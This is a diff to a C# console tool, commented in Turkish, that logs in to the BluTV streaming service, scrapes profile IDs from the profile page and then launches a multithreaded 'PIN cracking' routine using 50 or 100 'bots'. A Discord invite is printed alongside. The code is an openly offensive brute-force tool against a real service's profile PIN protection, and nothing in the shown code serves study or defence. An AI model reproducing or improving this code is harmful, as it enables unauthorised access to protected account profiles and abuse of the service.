@@ -21,6 +21,7 @@ namespace Recoo
         private static Parallelizer<string, Result> parallelizer = null;
         public static int bad = 0;
         public static int check = 0;
+        private static string? profi;
 
 
         private static void Update() // Console title'ı güncelle
@@ -50,10 +51,10 @@ namespace Recoo
             Console.WriteLine("Email: "); email = Console.ReadLine();
 
             Console.WriteLine("Password: "); password = Console.ReadLine();
+            
+            Console.WriteLine("Kaçıncı Profil: "); profi = Console.ReadLine();
 
-            Console.WriteLine("Profil ID: "); profilid = Console.ReadLine();
-
-            Console.WriteLine("Bots: "); threadnumber = Convert.ToInt32(Console.ReadLine());
+            Console.WriteLine("Bots (50 veya 100 yazın): "); threadnumber = Convert.ToInt32(Console.ReadLine());
 
             Console.Clear(); // Consolu temizle //
             Console.ForegroundColor = ConsoleColor.Magenta;
@@ -77,10 +78,13 @@ namespace Recoo
             var settings = new ProxySettings();
             var proxyClient = new NoProxyClient(settings);
             using var client = new RLHttpClient(proxyClient); // Http Request ayarları //
+            var cookies = new Dictionary<string, string>();
+
             using var request = new HttpRequest
             {
                 Uri = new Uri("https://www.blutv.com/api/login"), // Login Post Ayarları //
                 Method = HttpMethod.Post,
+                Cookies = cookies,
                 Headers = new Dictionary<string, string>
                 {
                         {"Host", "www.blutv.com"},
@@ -117,6 +121,57 @@ namespace Recoo
 
             if (content.Contains("accessToken")) // Hesabı Kontrol Et //
             {
+                //$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$//
+                using var request_profil = new HttpRequest
+                {
+                    Uri = new Uri("https://www.blutv.com/profil"), // Login Post Ayarları //
+                    Method = HttpMethod.Get,
+                    Cookies = cookies,
+                    Headers = new Dictionary<string, string>
+                    {
+                        {"Host","www.blutv.com"},
+                        {"Connection","keep-alive"},
+                        {"AppPlatform","com.blu"},
+                        {"User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0"},
+                        {"AppCountry","TUR"},
+                        {"AppLanguage","tr-TR"},
+                        {"Accept","*/*"},
+                        {"Sec-Fetch-Site","same-origin"},
+                        {"Sec-Fetch-Mode","cors"},
+                        {"Sec-Fetch-Dest","empty"},
+                        {"Referer","https://www.blutv.com/giris"},
+                        {"Accept-Language","tr-TR,tr;q=0.9"},
+                        {"Accept-Encoding","gzip, deflate"},
+                    },
+                };
+
+                // Send the request //
+                using var response_profil = await client.SendAsync(request_profil);
+
+                // Read response //
+                var content_profil = await response_profil.Content.ReadAsStringAsync();
+
+                //Buradan seçtiği profilin id'sini alıyoz.
+                string pattern = @"profile-avatar-(\S+)""";
+                List<string> profileid = new List<string>();
+                MatchCollection matchCollection = Regex.Matches(content_profil, pattern);
+
+                if (matchCollection.Count > 0)
+                {
+                    foreach (Match match in matchCollection)
+                    {
+                        profileid.Add(match.Groups[1].Value);
+                    }
+                    profileid.Insert(0, "");
+                }
+                else
+                {
+                    Console.WriteLine("Profile ID çekilemedi.");
+                }
+
+                profilid = profileid[Convert.ToInt32(profi)];
+                
+                
                 Console.WriteLine("Pin Kırma Işlemi Başlıyor | .gg/Xd8VfYPHB3 "); // Hesap Doğru ise çalışacak kodlar //
                 string access = LRParser.ParseBetween(content, "{\"accessToken\":\"", "\",\"refreshToken\":\"").FirstOrDefault(); // Parse accesstoken //
                 Func<string, CancellationToken, Task<Result>> parityCheck = new(async (number, token) => // Thread Function'u
